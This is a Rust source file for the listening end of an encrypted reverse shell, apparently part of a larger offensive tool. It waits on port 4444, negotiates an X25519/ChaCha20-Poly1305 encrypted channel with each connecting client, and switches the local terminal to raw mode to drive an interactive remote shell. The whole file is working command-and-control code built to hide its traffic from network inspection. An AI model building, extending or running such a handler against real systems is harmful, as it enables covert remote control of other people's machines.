use futures::{SinkExt, StreamExt};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_util::codec::{FramedRead, FramedWrite};

// Crypto
use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
use rand_core::OsRng;
use x25519_dalek::{EphemeralSecret, PublicKey};

// Terminal Handling
use crossterm::terminal::{disable_raw_mode, enable_raw_mode};

// Import Codec (Assuming it's accessible via module or copy-paste)
#[path = "../codec.rs"]
mod codec;
use codec::EncryptedCodec;

// -----------------------------------------------------------------------------
// RAII Guard for Raw Mode
// ensures raw mode is disabled when this struct goes out of scope
// -----------------------------------------------------------------------------
struct RawModeGuard;

impl RawModeGuard {
    fn new() -> Result<Self, std::io::Error> {
        enable_raw_mode()?;
        Ok(Self)
    }
}

impl Drop for RawModeGuard {
    fn drop(&mut self) {
        // Ignore errors during drop, we tried our best
        let _ = disable_raw_mode();
        println!("\r\n[!] Session Ended. Terminal restored.");
    }
}

// -----------------------------------------------------------------------------
// MAIN LISTENER LOOP
// -----------------------------------------------------------------------------
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:4444").await?;
    println!("[*] Listening on 0.0.0.0:4444 (Encrypted, Framed, Interactive)...");

    loop {
        // Wait for a connection
        let (mut socket, addr) = listener.accept().await?;
        println!("[+] New connection from: {}", addr);

        // We handle this connection in the FOREGROUND because we need the TTY.
        // If you wanted to handle multiple shells, you'd need a Session Manager interface.
        match handle_session(&mut socket).await {
            Ok(_) => println!("[*] Waiting for next client..."),
            Err(e) => eprintln!("[-] Session Error: {}", e),
        }
    }
}

async fn handle_session(
    socket: &mut tokio::net::TcpStream,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("[*] Starting Handshake...");

    // 1. HANDSHAKE
    let my_secret = EphemeralSecret::random_from_rng(OsRng);
    let my_public = PublicKey::from(&my_secret);

    let mut client_pub_bytes = [0u8; 32];
    socket.read_exact(&mut client_pub_bytes).await?;
    let client_public = PublicKey::from(client_pub_bytes);

    socket.write_all(my_public.as_bytes()).await?;

    let shared_secret = my_secret.diffie_hellman(&client_public);
    let key = shared_secret.as_bytes();

    let cipher_tx = ChaCha20Poly1305::new_from_slice(key).unwrap();
    let cipher_rx = ChaCha20Poly1305::new_from_slice(key).unwrap();

    println!("[+] Handshake Complete. Entering Raw Mode.");

    // 2. ENABLE RAW MODE
    // The moment we create this variable, the terminal goes raw.
    // The moment this function returns (for ANY reason), it drops and restores terminal.
    let _guard = RawModeGuard::new()?;

    // 3. DATA PUMP
    let (raw_reader, raw_writer) = socket.split();
    let mut frame_reader = FramedRead::new(raw_reader, EncryptedCodec::new(cipher_rx));
    let mut frame_writer = FramedWrite::new(raw_writer, EncryptedCodec::new(cipher_tx));

    let mut stdin = tokio::io::stdin();
    let mut stdout = tokio::io::stdout();
    let mut stdin_buf = [0u8; 4096];

    loop {
        tokio::select! {
            // Network -> Stdout
            Some(result) = frame_reader.next() => {
                match result {
                    Ok(data) => {
                        // In raw mode, we must use \r\n for newlines,
                        // but the remote shell usually handles that.
                        // Just writing raw bytes is correct here.
                        stdout.write_all(&data).await?;
                        stdout.flush().await?;
                    }
                    Err(_) => break, // Integrity error or disconnect
                }
            }

            // Stdin -> Network
            Ok(n) = stdin.read(&mut stdin_buf) => {
                if n == 0 { break; }
                let data = stdin_buf[..n].to_vec();
                frame_writer.send(data).await?;
            }
        }
    }

    Ok(())
}
